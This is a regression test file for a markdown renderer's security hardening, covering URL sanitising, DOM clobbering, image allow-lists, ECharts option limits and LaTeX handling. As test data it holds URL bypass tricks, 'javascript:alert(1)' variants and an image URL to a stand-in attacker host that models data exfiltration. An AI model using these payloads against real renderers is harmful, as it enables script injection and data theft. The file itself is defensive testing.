// Regression tests for the issues found in the 0.1.0 review: each uses the input that showed the bug.
import { describe, it, mock, before } from 'node:test';

import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import {
  hardenEChartsOption,
  MarkdownView,
  normalizeLatexDelimiters,
  parseMarkdown,
  sanitizeMarkdownUrl,
} from '../dist/web/index.js';
import * as stub from './stubs/react-native.ts';
import { expect } from './expect.ts';

mock.module('react-native', { namedExports: stub });
type Native = typeof import('../dist/native/index.js');
let native: Native;
before(async () => {
  native = await import('../dist/native/index.js');
});

const web = (children: string, props: Record<string, unknown> = {}) =>
  renderToStaticMarkup(createElement(MarkdownView, { ...props, children }));

describe('URL policy: what the browser will read', () => {
  it('refuses backslash and whitespace tricks that become //host or javascript:', () => {
    for (const url of ['/\\evil.example/y.png', '/\t/evil.example/z.png', '\\\\evil.example/x', 'java\tscript:alert(1)', 'java\nscript:alert(1)']) {
      expect(sanitizeMarkdownUrl(url)).toBeNull();
    }
    expect(sanitizeMarkdownUrl('/docs/a.md')).toBe('/docs/a.md');
  });

  it('raw HTML images with those tricks are not rendered', () => {
    const html = web('<img src="/\\evil.example/y.png"> <img src="/&#9;/evil.example/z.png">');
    expect(html).not.toContain('evil.example');
  });
});

describe('web: DOM clobbering', () => {
  it('prefixes ids and names from raw HTML', () => {
    const html = web('<div id="root">x</div> <a id="defaultView" name="top">y</a>');
    expect(html).not.toMatch(/id="root"/);
    expect(html).toContain('id="user-content-root"');
    // A name either gets the prefix or, on an anchor without href (rendered as text), is dropped.
    expect(html).not.toMatch(/name="top"/);
  });

  it('keeps footnote ids and links matching (no double prefix)', () => {
    const html = web(['Text[^1].', '', '[^1]: Note.'].join('\n'));
    expect(html).toContain('href="#user-content-fn-1"');
    expect(html).toContain('id="user-content-fn-1"');
    expect(html).not.toContain('user-content-user-content');
  });
});

describe('image policy', () => {
  const allowOnlyCdn = (url: string) => url.startsWith('https://cdn.example.com/');

  it('web: a refused image shows its alt text and has no src', () => {
    const html = web('![chart](https://cdn.example.com/a.png) ![leak](https://evil.example/?q=secret)', { isImageAllowed: allowOnlyCdn });
    expect(html).toContain('src="https://cdn.example.com/a.png"');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('[leak]');
  });

  it('native: a refused image is not requested', () => {
    stub.rendered.length = 0;
    renderToStaticMarkup(createElement(native.MarkdownView, { isImageAllowed: allowOnlyCdn, children: '![leak](https://evil.example/?q=secret)' }));
    expect(stub.rendered.some((n) => n.type === 'Image')).toBe(false);
  });
});

describe('ECharts: options that freeze the page', () => {
  it('caps splitNumber anywhere', () => {
    const out = hardenEChartsOption({ series: [{ type: 'gauge', splitNumber: 100_000_000, axisTick: { splitNumber: 1e9 } }] }) as {
      series: { splitNumber: number; axisTick: { splitNumber: number } }[];
    };
    expect(out.series[0]!.splitNumber).toBe(100);
    expect(out.series[0]!.axisTick.splitNumber).toBe(100);
  });

  it('drops axis tick steps, keeps label intervals', () => {
    const out = hardenEChartsOption({
      yAxis: { max: 1e9, interval: 1, minInterval: 1, axisLabel: { interval: 2 } },
      xAxis: [{ type: 'value', maxInterval: 1 }],
      series: [{ type: 'line', data: [1] }],
    }) as { yAxis: Record<string, unknown>; xAxis: Record<string, unknown>[] };
    expect(out.yAxis.interval).toBeUndefined();
    expect(out.yAxis.minInterval).toBeUndefined();
    expect((out.yAxis.axisLabel as { interval: number }).interval).toBe(2);
    expect(out.xAxis[0]!.maxInterval).toBeUndefined();
  });

  it('drops a string array under link (only axisPointer objects are kept)', () => {
    const json = JSON.stringify(hardenEChartsOption({ series: [{ type: 'treemap', data: [{ name: 'a', value: 1, link: ['javascript:alert(1)'] }] }] }));
    expect(json).not.toContain('javascript:');
  });
});

describe('LaTeX delimiters: only math, never code', () => {
  it('leaves escaped brackets in prose and indexing alone', () => {
    expect(normalizeLatexDelimiters('Escape like \\[this\\] and arr\\[0\\]')).toBe('Escape like \\[this\\] and arr\\[0\\]');
  });

  it('still converts what models write', () => {
    expect(normalizeLatexDelimiters('where \\( x \\) is')).toBe('where $$x$$ is');
    expect(normalizeLatexDelimiters('\\[ a^2 + b^2 = c^2 \\]')).toContain('$$\na^2 + b^2 = c^2\n$$');
    expect(normalizeLatexDelimiters('\\( 2x \\)')).toBe('$$2x$$');
  });

  it('never touches ~~~ fences, nested fences or a fence still streaming', () => {
    for (const md of ['~~~\n\\( x^2 \\)\n~~~', '````md\n```\n\\( x^2 \\)\n```\n````', '```tex\n\\( x^2 \\)\nstill typing']) {
      expect(normalizeLatexDelimiters(md)).toBe(md);
    }
  });

  it('converts math after a fence closes', () => {
    expect(normalizeLatexDelimiters('```\ncode\n```\nthen \\( y^2 \\)')).toContain('$$y^2$$');
  });

  it('parses into inline math in mdast', () => {
    const tree = parseMarkdown('area \\( \\pi r^2 \\)') as { children: { children: { type: string }[] }[] };
    expect(tree.children[0]!.children.some((n) => n.type === 'inlineMath')).toBe(true);
  });
});

describe('React Native: URLs and streaming', () => {
  it('resolves relative references like a browser (RN URL cannot)', () => {
    expect(native.joinUrl('https://s.example/docs/a.md', '../img.png')).toBe('https://s.example/img.png');
    expect(native.joinUrl('https://s.example/docs/', '/x')).toBe('https://s.example/x');
    expect(native.joinUrl('https://s.example/docs/a.md', 'b.md?x=1#top')).toBe('https://s.example/docs/b.md?x=1#top');
    expect(native.joinUrl('https://s.example', 'a/./b/../c')).toBe('https://s.example/a/c');
    expect(native.joinUrl('https://s.example/docs/a.md?q', '?r')).toBe('https://s.example/docs/a.md?r');
    expect(native.resolveUrl('../up.md', 'https://s.example/docs/')).toBe('https://s.example/up.md');
  });

  it('shows a Mermaid diagram as source while streaming (no WebView per chunk)', () => {
    const pages: string[] = [];
    const WebView = (props: { source: { html: string } }) => (pages.push(props.source.html), createElement('rn-webview'));
    const md = '```mermaid\ngraph TD; A-->B;\n```';
    renderToStaticMarkup(createElement(native.MarkdownView, { webView: WebView, streaming: true, children: md }));
    expect(pages).toHaveLength(0);
    renderToStaticMarkup(createElement(native.MarkdownView, { webView: WebView, children: md }));
    expect(pages).toHaveLength(1);
  });

  it('WebViews allow only their own document and only the pinned files', () => {
    expect(native.allowWebViewRequest({ url: 'about:blank' })).toBe(true);
    expect(native.allowWebViewRequest({ url: 'data:text/html,<script>x</script>' })).toBe(false);
    const html = native.mermaidHtml('graph TD; A-->B;', native.LIGHT_THEME, false);
    expect(html).toContain(`script-src ${native.MERMAID_SCRIPT.url} 'unsafe-inline'`);
    expect(html).not.toMatch(/script-src https:\/\/cdn\.jsdelivr\.net[ ;]/);
    expect(native.mathHtml('x', native.LIGHT_THEME)).toMatch(/font-src data: https:\/\/cdn\.jsdelivr\.net\/npm\/katex@[\d.]+\/dist\/fonts\//);
  });
});
